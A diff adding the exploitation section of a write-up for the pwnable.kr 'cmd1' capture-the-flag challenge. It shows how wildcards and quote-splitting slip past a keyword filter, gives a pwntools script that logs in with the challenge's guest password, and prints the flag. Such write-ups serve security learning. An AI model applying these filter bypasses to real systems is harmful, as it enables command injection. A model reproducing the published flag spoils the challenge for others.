@@ -49,4 +49,54 @@ As we can see we have 2 functions, the main() & the filter() function. At filter
 
 # 0x02 Exploitation + PoC
 
++ 1way Wildcards
 
+```bash
+cmd1@prowl:~$ ./cmd1 "/bin/cat *"
+rand0000m_sh1tz_l0l
+mommy now I get what PATH environment is for :)
+```
+
+
+```bash
+cmd1@prowl:~$ ./cmd1 "/bin/cat fl?g"
+mommy now I get what PATH environment is for :)
+```
+
++ 2way single quotes
+
+```bash
+cmd1@prowl:~$ ./cmd1 "/bin/cat f'la'g"
+mommy now I get what PATH environment is for :)
+```
+
+I wrote a simple PoC with pwntools.
+
+```python
+#!/usr/bin/env python
+from pwn import *
+
+shell = ssh('cmd1', 'pwnable.kr', password='guest', port=2222)
+sh = shell.run('./cmd1 "/bin/cat fla?"')
+log.success("Flag : " + sh.recvline())
+```
+
+Let's fire it up!
+
+```bash
+[root@pwn4magic]:~/Desktop# python cmd1.py 
+[+] Connecting to pwnable.kr on port 2222: Done
+[*] cmd1@pwnable.kr:
+    Distro    Ubuntu 16.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.4.179
+    ASLR:     Enabled
+[+] Opening new channel: './cmd1 "/bin/cat fla?"': Done
+[+] Flag : mommy now I get what PATH environment is for :)
+[*] Closed SSH channel with pwnable.kr
+```
+
+Flag : `mommy now I get what PATH environment is for :)`
+
+-pwn4magic
